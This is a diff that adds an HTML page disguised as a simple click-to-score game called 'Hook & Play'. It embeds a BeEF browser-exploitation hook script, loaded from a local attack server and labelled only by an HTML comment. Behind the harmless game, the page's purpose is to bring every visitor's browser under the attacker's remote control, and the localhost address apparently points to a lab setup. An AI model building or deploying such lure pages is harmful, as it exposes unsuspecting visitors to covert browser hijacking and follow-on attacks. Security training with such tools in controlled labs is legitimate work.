@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Hook & Play</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #121212;
+      color: #e0e0e0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    h1 {
+      margin-bottom: 20px;
+    }
+    #score {
+      font-size: 2rem;
+      margin: 15px 0;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 1.2rem;
+      border: none;
+      border-radius: 8px;
+      background: #0078d7;
+      color: white;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background: #005ea1;
+    }
+  </style>
+</head>
+<body>
+  <h1>Catch the Points!</h1>
+  <div id="score">Score: 0</div>
+  <button id="gameButton">Click me!</button>
+
+  <!-- BeEF Hook -->
+  <script src="http://127.0.0.1:3000/hook.js"></script>
+
+  <script>
+    let score = 0;
+    const scoreDisplay = document.getElementById('score');
+    const button = document.getElementById('gameButton');
+
+    button.addEventListener('click', () => {
+      score++;
+      scoreDisplay.textContent = `Score: ${score}`;
+    });
+  </script>
+</body>
+</html>
